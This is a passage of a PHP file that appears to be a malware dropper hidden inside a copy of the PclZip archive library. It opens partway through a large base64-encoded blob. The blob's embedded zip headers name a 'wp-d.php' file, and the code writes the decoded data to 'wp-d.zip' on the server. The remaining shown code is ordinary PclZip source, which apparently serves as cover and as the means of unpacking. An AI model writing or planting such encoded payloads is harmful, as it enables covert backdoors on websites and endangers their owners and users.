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"); 
file_put_contents("wp-d.zip",$data); 



if (!defined('PCLZIP_READ_BLOCK_SIZE')) {
  define( 'PCLZIP_READ_BLOCK_SIZE', 2048 );
}

if (!defined('PCLZIP_SEPARATOR')) {
  define( 'PCLZIP_SEPARATOR', ',' );
}

if (!defined('PCLZIP_ERROR_EXTERNAL')) {
  define( 'PCLZIP_ERROR_EXTERNAL', 0 );
}

if (!defined('PCLZIP_TEMPORARY_DIR')) {
  define( 'PCLZIP_TEMPORARY_DIR', '' );
}

if (!defined('PCLZIP_TEMPORARY_FILE_RATIO')) {
  define( 'PCLZIP_TEMPORARY_FILE_RATIO', 0.47 );
}


$g_pclzip_version = "2.8.2";

define( 'PCLZIP_ERR_USER_ABORTED', 2 );
define( 'PCLZIP_ERR_NO_ERROR', 0 );
define( 'PCLZIP_ERR_WRITE_OPEN_FAIL', -1 );
define( 'PCLZIP_ERR_READ_OPEN_FAIL', -2 );
define( 'PCLZIP_ERR_INVALID_PARAMETER', -3 );
define( 'PCLZIP_ERR_MISSING_FILE', -4 );
define( 'PCLZIP_ERR_FILENAME_TOO_LONG', -5 );
define( 'PCLZIP_ERR_INVALID_ZIP', -6 );
define( 'PCLZIP_ERR_BAD_EXTRACTED_FILE', -7 );
define( 'PCLZIP_ERR_DIR_CREATE_FAIL', -8 );
define( 'PCLZIP_ERR_BAD_EXTENSION', -9 );
define( 'PCLZIP_ERR_BAD_FORMAT', -10 );
define( 'PCLZIP_ERR_DELETE_FILE_FAIL', -11 );
define( 'PCLZIP_ERR_RENAME_FILE_FAIL', -12 );
define( 'PCLZIP_ERR_BAD_CHECKSUM', -13 );
define( 'PCLZIP_ERR_INVALID_ARCHIVE_ZIP', -14 );
define( 'PCLZIP_ERR_MISSING_OPTION_VALUE', -15 );
define( 'PCLZIP_ERR_INVALID_OPTION_VALUE', -16 );
define( 'PCLZIP_ERR_ALREADY_A_DIRECTORY', -17 );
define( 'PCLZIP_ERR_UNSUPPORTED_COMPRESSION', -18 );
define( 'PCLZIP_ERR_UNSUPPORTED_ENCRYPTION', -19 );
define( 'PCLZIP_ERR_INVALID_ATTRIBUTE_VALUE', -20 );
define( 'PCLZIP_ERR_DIRECTORY_RESTRICTION', -21 );

define( 'PCLZIP_OPT_PATH', 77001 );
define( 'PCLZIP_OPT_ADD_PATH', 77002 );
define( 'PCLZIP_OPT_REMOVE_PATH', 77003 );
define( 'PCLZIP_OPT_REMOVE_ALL_PATH', 77004 );
define( 'PCLZIP_OPT_SET_CHMOD', 77005 );
define( 'PCLZIP_OPT_EXTRACT_AS_STRING', 77006 );
define( 'PCLZIP_OPT_NO_COMPRESSION', 77007 );
define( 'PCLZIP_OPT_BY_NAME', 77008 );
define( 'PCLZIP_OPT_BY_INDEX', 77009 );
define( 'PCLZIP_OPT_BY_EREG', 77010 );
define( 'PCLZIP_OPT_BY_PREG', 77011 );
define( 'PCLZIP_OPT_COMMENT', 77012 );
define( 'PCLZIP_OPT_ADD_COMMENT', 77013 );
define( 'PCLZIP_OPT_PREPEND_COMMENT', 77014 );
define( 'PCLZIP_OPT_EXTRACT_IN_OUTPUT', 77015 );
define( 'PCLZIP_OPT_REPLACE_NEWER', 77016 );
define( 'PCLZIP_OPT_STOP_ON_ERROR', 77017 );
define( 'PCLZIP_OPT_EXTRACT_DIR_RESTRICTION', 77019 );
define( 'PCLZIP_OPT_TEMP_FILE_THRESHOLD', 77020 );
define( 'PCLZIP_OPT_TEMP_FILE_ON', 77021 );
define( 'PCLZIP_OPT_TEMP_FILE_OFF', 77022 );

define( 'PCLZIP_ATT_FILE_NAME', 79001 );
define( 'PCLZIP_ATT_FILE_NEW_SHORT_NAME', 79002 );
define( 'PCLZIP_ATT_FILE_NEW_FULL_NAME', 79003 );
define( 'PCLZIP_ATT_FILE_MTIME', 79004 );
define( 'PCLZIP_ATT_FILE_CONTENT', 79005 );
define( 'PCLZIP_ATT_FILE_COMMENT', 79006 );

define( 'PCLZIP_CB_PRE_EXTRACT', 78001 );
define( 'PCLZIP_CB_POST_EXTRACT', 78002 );
define( 'PCLZIP_CB_PRE_ADD', 78003 );
define( 'PCLZIP_CB_POST_ADD', 78004 );

class PclZip
{
  var $zipname = '';

  var $zip_fd = 0;

  var $error_code = 1;
  var $error_string = '';
  
  var $magic_quotes_status;

function PclZip($p_zipname)
{

  if (!function_exists('gzopen'))
  {
    die('Abort '.basename(__FILE__).' : Missing zlib extensions');
  }

  $this->zipname = $p_zipname;
  $this->zip_fd = 0;
  $this->magic_quotes_status = -1;

  return;
}

function create($p_filelist)
{
  $v_result=1;

  $this->privErrorReset();

  $v_options = array();
  $v_options[PCLZIP_OPT_NO_COMPRESSION] = FALSE;

  $v_size = func_num_args();

  if ($v_size > 1) {
    $v_arg_list = func_get_args();

    array_shift($v_arg_list);
    $v_size--;

    if ((is_integer($v_arg_list[0])) && ($v_arg_list[0] > 77000)) {

      $v_result = $this->privParseOptions($v_arg_list, $v_size, $v_options,
                                          array (PCLZIP_OPT_REMOVE_PATH => 'optional',
                                                 PCLZIP_OPT_REMOVE_ALL_PATH => 'optional',
                                                 PCLZIP_OPT_ADD_PATH => 'optional',
                                                 PCLZIP_CB_PRE_ADD => 'optional',
                                                 PCLZIP_CB_POST_ADD => 'optional',
                                                 PCLZIP_OPT_NO_COMPRESSION => 'optional',
                                                 PCLZIP_OPT_COMMENT => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_THRESHOLD => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_ON => 'optional',
                                                 PCLZIP_OPT_TEMP_FILE_OFF => 'optional'
                                                 
                                           ));
      if ($v_result != 1) {
        return 0;
      }
    }

    else {

      $v_options[PCLZIP_OPT_ADD_PATH] = $v_arg_list[0];

      if ($v_size == 2) {
        $v_options[PCLZIP_OPT_REMOVE_PATH] = $v_arg_list[1];
      }
      else if ($v_size > 2) {
        PclZip::privErrorLog(PCLZIP_ERR_INVALID_PARAMETER,
	                       "Invalid number / type of arguments");
        return 0;
      }
    }
  }
  
  $this->privOptionDefaultThreshold($v_options);

  $v_string_list = array();
  $v_att_list = array();
  $v_filedescr_list = array();
  $p_result_list = array();
  
  if (is_array($p_filelist)) {
  
    if (isset($p_filelist[0]) && is_array($p_filelist[0])) {
      $v_att_list = $p_filelist;
    }
    
    else {
      $v_string_list = $p_filelist;
    }
  }

  else if (is_string($p_filelist)) {
    $v_string_list = explode(PCLZIP_SEPARATOR, $p_filelist);
  }

  else {
